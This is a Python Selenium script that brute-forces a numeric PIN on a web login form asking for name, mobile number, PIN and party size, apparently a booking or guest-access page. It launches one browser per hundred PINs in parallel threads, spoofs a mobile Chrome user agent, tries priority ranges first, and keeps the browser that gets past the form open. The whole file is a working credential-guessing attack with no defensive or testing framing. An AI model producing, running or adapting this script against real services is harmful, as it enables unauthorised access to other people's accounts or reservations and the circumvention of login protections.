import time
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from enum import Enum

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException

import settings

CHUNK_SIZE = 100  # one browser per 100 PINs


class ResponseState(Enum):
    FORM    = "form"
    FAIL    = "fail"
    SUCCESS = "success"
    ERROR   = "error"


_print_lock = threading.Lock()
_found_event = threading.Event()
_counter = [0]
_counter_lock = threading.Lock()


def make_driver() -> webdriver.Chrome:
    options = webdriver.ChromeOptions()
    options.add_argument("--start-maximized")
    options.add_argument(
        "user-agent=Mozilla/5.0 (Linux; Android 14; Pixel 8) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/122.0.6261.119 Mobile Safari/537.36"
    )
    return webdriver.Chrome(options=options)


def classify(driver: webdriver.Chrome) -> ResponseState:
    try:
        body = driver.find_element(By.TAG_NAME, "body").text.lower()
    except Exception:
        return ResponseState.ERROR

    if "pin is not correct" in body:
        return ResponseState.FAIL

    current_url = driver.current_url.split("?")[0]
    original_url = settings.URL.split("?")[0]
    if current_url == original_url:
        return ResponseState.FORM

    return ResponseState.SUCCESS


def fill_and_submit(driver: webdriver.Chrome, wait: WebDriverWait, pin: int):
    driver.get(settings.URL)
    wait.until(EC.presence_of_element_located((By.NAME, "txtName")))

    if settings.MY_NAME:
        driver.find_element(By.NAME, "txtName").clear()
        driver.find_element(By.NAME, "txtName").send_keys(settings.MY_NAME)

    driver.find_element(By.NAME, "txtMobile").clear()
    driver.find_element(By.NAME, "txtMobile").send_keys(settings.PHONE)

    driver.find_element(By.NAME, "txtPin").clear()
    driver.find_element(By.NAME, "txtPin").send_keys(str(pin))

    try:
        Select(driver.find_element(By.NAME, "DDLP1")).select_by_value(str(settings.ADULTS))
    except NoSuchElementException:
        pass

    try:
        # DDLP2 values are offset: value="1" means 0 children, value="2" means 1 child, etc.
        Select(driver.find_element(By.NAME, "DDLP2")).select_by_value(str(settings.CHILDREN + 1))
    except NoSuchElementException:
        pass

    driver.find_element(By.NAME, "btnLogin").click()
    time.sleep(1)


def try_chunk(pins: list[int], total: int) -> tuple[int, webdriver.Chrome] | None:
    """Try a chunk of PINs in one browser. Returns (pin, driver) on success, None otherwise."""
    driver = make_driver()
    wait = WebDriverWait(driver, 10)

    try:
        for pin in pins:
            if _found_event.is_set():
                return None

            try:
                fill_and_submit(driver, wait, pin)
            except (NoSuchElementException, TimeoutException) as e:
                with _print_lock:
                    print(f"\n[!] Error on PIN {pin}: {e}")
                time.sleep(2)
                continue

            state = classify(driver)

            with _counter_lock:
                _counter[0] += 1
                i = _counter[0]

            pct = i / total * 100
            with _print_lock:
                print(f"\r[{i}/{total}] {pct:.1f}%  PIN: {pin:05d} | {state.value}    ", end="", flush=True)

            if state == ResponseState.SUCCESS:
                _found_event.set()
                return pin, driver  # keep driver open so user can see result

            if settings.DELAY > 0:
                time.sleep(settings.DELAY)

    except Exception:
        driver.quit()
        raise

    driver.quit()
    return None


def main():
    if not settings.PHONE:
        print("[!] PHONE is not set in .env")
        sys.exit(1)

    full_range = range(settings.PIN_START, settings.PIN_END + 1)
    priority = settings.PRIORITY_RANGE or range(0, 0)
    priority_set = set(priority)
    pin_sequence = list(priority) + [p for p in full_range if p not in priority_set]
    total = len(pin_sequence)

    chunks = [pin_sequence[i:i + CHUNK_SIZE] for i in range(0, total, CHUNK_SIZE)]
    num_threads = len(chunks)

    print(f"[*] Name      : {settings.MY_NAME or '(not set)'}")
    print(f"[*] Phone     : {settings.PHONE}")
    print(f"[*] Adults    : {settings.ADULTS}  Children: {settings.CHILDREN}")
    print(f"[*] PIN range : {settings.PIN_START} – {settings.PIN_END}")
    if settings.PRIORITY_RANGE:
        print(f"[*] Priority  : {settings.PRIORITY_RANGE.start} – {settings.PRIORITY_RANGE.stop - 1} (tried first)")
    print(f"[*] Browsers  : {num_threads} ({CHUNK_SIZE} PINs each)")
    print(f"[*] Opening {num_threads} browser windows...\n")

    winning_driver = None
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(try_chunk, chunk, total) for chunk in chunks]
        for future in as_completed(futures):
            outcome = future.result()
            if outcome is not None:
                winning_pin, winning_driver = outcome
                break

    if winning_driver:
        print(f"\n\n[+] SUCCESS! PIN found: {winning_pin}")
        print(f"[+] Current URL: {winning_driver.current_url}")
        print(f"[+] Page text: {winning_driver.find_element(By.TAG_NAME, 'body').text[:300]}")
        input("\nPress Enter to close all browsers...")
        winning_driver.quit()
    else:
        print(f"\n\n[-] No valid PIN found in range {settings.PIN_START}–{settings.PIN_END}.")


if __name__ == "__main__":
    main()
